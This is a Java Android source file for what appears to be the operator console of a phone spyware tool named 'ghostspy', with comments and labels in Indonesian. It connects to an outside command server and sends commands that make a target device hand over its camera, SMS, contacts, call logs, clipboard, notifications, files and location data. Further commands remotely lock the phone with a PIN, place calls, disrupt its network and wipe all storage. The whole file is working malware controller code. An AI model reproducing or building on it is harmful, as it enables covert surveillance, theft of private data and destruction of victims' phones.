package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        deviceId = getIntent().getStringExtra("deviceId");
        String model = getIntent().getStringExtra("deviceModel");
        String battery = getIntent().getStringExtra("battery");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(0xFF0B0E17);
        layout.setPadding(16, 16, 16, 16);

        // Bar atas
        LinearLayout topBar = new LinearLayout(this);
        topBar.setOrientation(LinearLayout.HORIZONTAL);
        topBar.setGravity(Gravity.CENTER_VERTICAL);
        topBar.setPadding(0, 0, 0, 16);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        topBar.addView(backBtn);

        TextView infoCapsule = new TextView(this);
        infoCapsule.setText(model + " | Bat: " + battery + "%");
        infoCapsule.setTextColor(0xFFFFFFFF);
        infoCapsule.setPadding(12, 8, 12, 8);
        infoCapsule.setBackgroundColor(0xFF1A1A2E);
        LinearLayout.LayoutParams capsParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        capsParams.setMargins(12, 0, 12, 0);
        infoCapsule.setLayoutParams(capsParams);
        infoCapsule.setGravity(Gravity.CENTER);
        topBar.addView(infoCapsule);

        TextView notifBadge = new TextView(this);
        notifBadge.setText("2");
        notifBadge.setTextColor(0xFFFFFFFF);
        notifBadge.setBackgroundColor(0xFFFF1E5A);
        notifBadge.setPadding(10, 4, 10, 4);
        topBar.addView(notifBadge);

        layout.addView(topBar);

        // Grid 4 kolom
        LinearLayout grid = new LinearLayout(this);
        grid.setOrientation(LinearLayout.VERTICAL);
        String[][] items = {
            {"Kamera", "#FF1E5A", "start_camera"},
            {"Sms Baru", "#FF4D8D", "get_sms"},
            {"Kontak", "#00E676", "get_contacts"},
            {"Panggilan", "#FFC107", "get_calls"},
            {"Clipboard", "#2ED8FF", "get_clipboard"},
            {"Aplikasi", "#2196F3", "get_apps"},
            {"Jaringan", "#9C27B0", "get_network"},
            {"Notifikasi", "#FF9800", "get_notifications"},
            {"WiFi Scan", "#00BCD4", "wifiscan"},
            {"WiFi History", "#3F51B5", "wifihistory"},
            {"Cell Tower", "#607D8B", "celltower"},
            {"File Manager", "#FF5722", "list_files"}
        };

        LinearLayout row = null;
        for (int i = 0; i < items.length; i++) {
            if (i % 3 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                grid.addView(row);
            }
            String[] item = items[i];
            TextView card = new TextView(this);
            card.setText(item[0]);
            card.setTextColor(0xFFFFFFFF);
            card.setBackgroundColor((int) Long.parseLong(item[1].substring(1), 16) | 0x22000000);
            card.setPadding(8, 24, 8, 24);
            card.setGravity(Gravity.CENTER);
            LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 120, 1);
            p.setMargins(6, 6, 6, 6);
            card.setLayoutParams(p);
            card.setOnClickListener(v -> handleAction(item[2]));
            row.addView(card);
        }
        layout.addView(grid);

        // Tombol Pusat Kontrol
        Button controlCenterBtn = new Button(this);
        controlCenterBtn.setText("🎛️ Pusat Kontrol");
        controlCenterBtn.setTextColor(0xFFFFFFFF);
        controlCenterBtn.setBackgroundColor(0xFFFF1E5A);
        controlCenterBtn.setOnClickListener(v -> showControlCenterPopup());
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        btnParams.setMargins(0, 24, 0, 0);
        controlCenterBtn.setLayoutParams(btnParams);
        layout.addView(controlCenterBtn);

        setContentView(layout);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {
            Toast.makeText(this, "Socket error", Toast.LENGTH_SHORT).show();
        }
    }

    private void handleAction(String cmd) {
        switch (cmd) {
            case "list_files":
                showInputDialog("Path (/sdcard)", path -> sendCmd(cmd, new JSONObject() {{
                    try { put("path", path.isEmpty() ? "/sdcard" : path); } catch (Exception e) {}
                }}));
                break;
            default:
                sendCmd(cmd, new JSONObject());
        }
    }

    private void showControlCenterPopup() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("🎛️ Pusat Kontrol");
        LinearLayout popupLayout = new LinearLayout(this);
        popupLayout.setOrientation(LinearLayout.VERTICAL);
        popupLayout.setPadding(16, 16, 16, 16);

        String[][] controls = {
            {"Buka Website", "Remote browsing target", "openurl"},
            {"Nyalakan Senter", "Kontrol flashlight device", "flashlight"},
            {"Getarkan Perangkat", "Vibrate dengan durasi custom", "vibrate"},
            {"Teks Layar", "Tampilkan toast message", "toast"},
            {"Kirim Suara", "Text-to-Speech Google", "speak"},
            {"Kunci HP", "Lock target dengan PIN", "lock"},
            {"Unlock HP", "Buka kunci layar remote", "unlock"},
            {"Panggil Nomor", "Trigger phone call", "call"},
            {"Ubah Wallpaper", "Set wallpaper dari URL", "wallpaper"},
            {"Putar Musik", "Play audio dari URL", "playmusic"},
            {"Lag Sinyal", "Atur kelancaran game target", "lagsignal"},
            {"Kirim Notifikasi", "Push notification", "notify"},
            {"Hapus Semua File", "menghapus semua storage", "wipe"}
        };

        for (String[] ctrl : controls) {
            LinearLayout item = new LinearLayout(this);
            item.setOrientation(LinearLayout.HORIZONTAL);
            item.setPadding(8, 12, 8, 12);
            item.setGravity(Gravity.CENTER_VERTICAL);

            TextView label = new TextView(this);
            label.setText(ctrl[0] + "\n" + ctrl[1]);
            label.setTextColor(0xFFFFFFFF);
            label.setTextSize(14);
            LinearLayout.LayoutParams labelParams = new LinearLayout.LayoutParams(
                    0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
            label.setLayoutParams(labelParams);

            Button btn = new Button(this);
            btn.setText("▶");
            btn.setTextColor(0xFFFFFFFF);
            btn.setBackgroundColor(0xFFFF1E5A);
            btn.setOnClickListener(v -> {
                sendCmd(ctrl[2], new JSONObject());
                // Tutup dialog setelah kirim perintah
                // (tidak bisa langsung, kita abaikan)
            });
            item.addView(label);
            item.addView(btn);
            popupLayout.addView(item);
        }

        builder.setView(popupLayout);
        builder.setNegativeButton("Tutup", null);
        builder.show();
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        } else {
            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
        }
    }

    private void showInputDialog(String title, InputCallback callback) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);
        EditText input = new EditText(this);
        builder.setView(input);
        builder.setPositiveButton("OK", (d, w) -> callback.onInput(input.getText().toString()));
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    interface InputCallback { void onInput(String input); }
}
